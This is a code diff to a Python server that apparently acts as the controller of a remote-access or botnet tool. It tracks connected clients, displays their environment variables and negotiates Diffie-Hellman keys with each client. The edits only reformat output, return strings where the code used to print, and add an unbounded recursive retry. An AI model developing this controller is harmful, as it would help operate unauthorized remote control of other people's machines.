@@ -164,11 +164,21 @@ class ServerThread(threading.Thread):
         print(self._text_color + self._text_style)
         if self.current_client:
             self.current_client.lock.clear()
-            print('\n' + data + '\n')
+            try:
+                data = json.loads(bytes(data))
+                print(json.dumps({"{:<25}".format(k): "{:>55}".format(v) for k,v in data.items()}, indent=2))
+            except:
+                data = bytes(data)
+                print("\n" + data + "\n")
             self.current_client.lock.set()
         else:
             self.lock.clear()
-            print('\n' + data + '\n')
+            try:
+                data = json.loads(bytes(data))
+                print(json.dumps({"{:<25}".format(k): "{:>55}".format(v) for k,v in data.items()}, indent=2))
+            except:
+                data = bytes(data)
+                print("\n" + data + "\n")
             self.lock.set()
 
     def _return(self):
@@ -418,13 +428,12 @@ class ServerThread(threading.Thread):
     def show_client_info(self, client_id=None):
         if str(client_id).isdigit() and int(client_id) in self.clients:
             client = self.clients[int(client_id)]
-            self._print('\n'.join(['\n {}{:>20}'.format('ENVIRONMENT','VARIABLES')] + [' --------------------------------'] + [' {:>13} {:>18}'.format(a,b) for a,b in client.info.items()]) + '\n')
+            return '\n'.join(['\n {}{:>20}'.format('ENVIRONMENT','VARIABLES')] + [' --------------------------------'] + [' {:>13} {:>18}'.format(a,b) for a,b in client.info.items()]) + '\n'
         elif self.current_client:
             client = self.current_client
-            self._print('\n'.join(['\n {}{:>20}'.format('ENVIRONMENT','VARIABLES')] + [' --------------------------------'] + [' {:>13} {:>18}'.format(a,b) for a,b in client.info.items()]) + '\n')
+            return '\n'.join(['\n {}{:>20}'.format('ENVIRONMENT','VARIABLES')] + [' --------------------------------'] + [' {:>13} {:>18}'.format(a,b) for a,b in client.info.items()]) + '\n'
         else:
-            self._error('Unable to display client information - invalid Client ID')
-        self._return()
+            return 'Unable to display client information - invalid Client ID'
 
     def list_clients(self):
         print(self._text_color + colorama.Style.BRIGHT + '\n{:>3}'.format('#') + colorama.Fore.YELLOW + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>64}'.format('Client ID') + colorama.Style.DIM + colorama.Fore.YELLOW + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>16}'.format('Address') + colorama.Style.DIM + colorama.Fore.YELLOW  + '\n-----------------------------------------------------------------------------------------')
@@ -709,6 +718,8 @@ class ClientHandler(threading.Thread):
             return threads['server']._obfuscate(y)
         except Exception as e:
             self._error("Diffie-Hellman transactionless key-agreement failed with error: {}".format(str(e)))
+            time.sleep(1)
+            return self.diffiehellman()
 
     def run(self):
         while True:
